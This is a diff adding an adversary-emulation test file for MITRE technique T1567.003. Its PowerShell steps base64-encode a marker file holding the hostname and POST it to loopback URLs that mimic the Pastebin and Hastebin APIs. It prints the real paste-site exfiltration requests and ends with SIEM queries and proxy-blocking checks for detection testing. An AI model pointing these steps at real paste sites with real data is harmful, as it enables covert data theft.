@@ -1,0 +1,98 @@
+id: T1567.003_exfiltration_over_web_service_text_storage
+name: "Exfiltration Over Web Service — Exfiltration to Text Storage Sites"
+mitre_technique: "T1567.003"
+mitre_tactic: "exfiltration"
+description: >
+  Adversaries exfiltrate data by posting it to text storage or paste sites
+  (Pastebin, Hastebin, paste.ee, ghostbin, dpaste.com). These sites accept
+  arbitrary text via HTTP POST, are typically allow-listed at corporate proxies,
+  and require no authentication. Data is usually base64-encoded or otherwise
+  obfuscated before posting. The resulting URL is sent back to the C2 for
+  retrieval. Detection relies on identifying POST requests to paste sites with
+  large encoded bodies.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1567/003/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1567.003 — Exfiltration to Text Storage Sites simulation (loopback only)"
+
+  - step: 2
+    type: exec_powershell
+    description: "Simulate Pastebin-style POST exfiltration"
+    command: |
+      $payload = "$env:TEMP\PAS_T1567_003_payload.txt"
+      "PAS-T1567.003-TEXT-SITE-EXFIL-$(Get-Date -Format o)|HOSTNAME=$env:COMPUTERNAME" |
+          Set-Content $payload
+
+      $encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes($payload))
+      Write-Host "[PAS] Text site exfiltration pattern (loopback):"
+      Write-Host "[PAS] Real: POST https://pastebin.com/api/api_post.php -Body api_paste_code=<data>"
+
+      # POST to loopback mimicking Pastebin API
+      try {
+          $req = [System.Net.WebRequest]::Create("http://127.0.0.1/api/api_post.php")
+          $req.Method = "POST"
+          $req.ContentType = "application/x-www-form-urlencoded"
+          $req.Timeout = 300
+          $body = [Text.Encoding]::UTF8.GetBytes(
+              "api_dev_key=PAS_FAKE_KEY&api_option=paste&api_paste_code=$encoded")
+          $req.ContentLength = $body.Length
+          $s = $req.GetRequestStream(); $s.Write($body,0,$body.Length); $s.Close()
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] Text storage POST to loopback generated"
+
+  - step: 3
+    type: exec_powershell
+    description: "Simulate Hastebin / raw text API variants"
+    command: |
+      Write-Host "[PAS] Hastebin-style API pattern:"
+      Write-Host "[PAS] Real: POST https://hastebin.com/documents -Body <raw_data>"
+      try {
+          $req = [System.Net.WebRequest]::Create("http://127.0.0.1/documents")
+          $req.Method = "POST"
+          $req.ContentType = "text/plain"
+          $req.Timeout = 300
+          $body = [Text.Encoding]::UTF8.GetBytes("PAS-T1567.003-HASTEBIN-EXFIL")
+          $req.ContentLength = $body.Length
+          $s = $req.GetRequestStream(); $s.Write($body,0,$body.Length); $s.Close()
+          $req.GetResponse() | Out-Null
+      } catch {}
+      Write-Host "[PAS] Hastebin-style POST to loopback generated"
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — HTTP POST to paste/text site domains with base64 body, powershell.exe uploading to pastebin.com"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove text site exfil payload"
+    command: |
+      Remove-Item "$env:TEMP\PAS_T1567_003_payload.txt" -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Text site exfil payload removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1567.003 cleanup complete"
+
+analyst_checklist:
+  - "Network event: HTTP POST to pastebin.com, hastebin.com, paste.ee from scripting process"
+  - "Network event: large base64-encoded POST body to text/paste service"
+  - "Sentinel: DeviceNetworkEvents | where RemoteUrl contains ('pastebin','hastebin','paste.ee') and InitiatingProcessFileName == 'powershell.exe'"
+  - "MDE alert: 'Data exfiltration to paste site'"
+  - "CONTROL CHECK: Block paste sites at web proxy — pastebin.com, hastebin.com have no legitimate business use on most corporate networks"
+  - "CONTROL CHECK: Web proxy category blocking — 'Paste/Collaboration' sites blocked for corporate devices"
